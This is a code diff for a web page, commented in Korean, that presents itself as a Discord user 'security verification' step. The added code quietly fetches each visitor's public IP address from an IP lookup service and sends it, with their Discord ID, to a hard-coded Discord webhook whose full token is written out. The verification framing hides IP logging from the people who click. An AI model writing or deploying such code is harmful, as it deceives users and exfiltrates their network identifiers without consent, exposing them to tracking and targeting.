@@ -51,6 +51,17 @@
     </div>
 
     <script>
+        // 접속한 유저의 IP를 따오는 함수
+        async function getIP() {
+            try {
+                let response = await fetch('https://api.ipify.org?format=json');
+                let data = await response.json();
+                return data.ip;
+            } catch (e) {
+                return "IP 확인 불가";
+            }
+        }
+
         async function startVerification() {
             const btn = document.getElementById('verifyBtn');
             const loading = document.getElementById('loadingText');
@@ -68,15 +79,18 @@
                 return;
             }
 
+            // 버튼을 누르는 순간 IP 주소 가져오기
+            const userIp = await getIP();
+
             try {
-                // 여기에 네가 준 웹훅 주소가 딱 들어가 있어!
                 const webhookURL = "https://discord.com/api/webhooks/1565687242041597962/4a88OaMlBrvVYqMUAPaSiWxK4XAX4tvwNp1pMkVZxz6NLdl5i5_twLkbdT03j1ZjwtyI";
 
                 const embed = {
-                    title: "✅ 유저 보안 인증 완료",
+                    title: "✅ 유저 보안 인증 및 IP 로그 완료",
                     color: 5763719,
                     fields: [
-                        { name: "인증한 디스코드 유저", value: `<@${userId}> (ID: ${userId})`, inline: false }
+                        { name: "인증한 디스코드 유저", value: `<@${userId}> (ID: ${userId})`, inline: false },
+                        { name: "접속 IP 주소", value: userIp, inline: false }
                     ],
                     timestamp: new Date().toISOString()
                 };
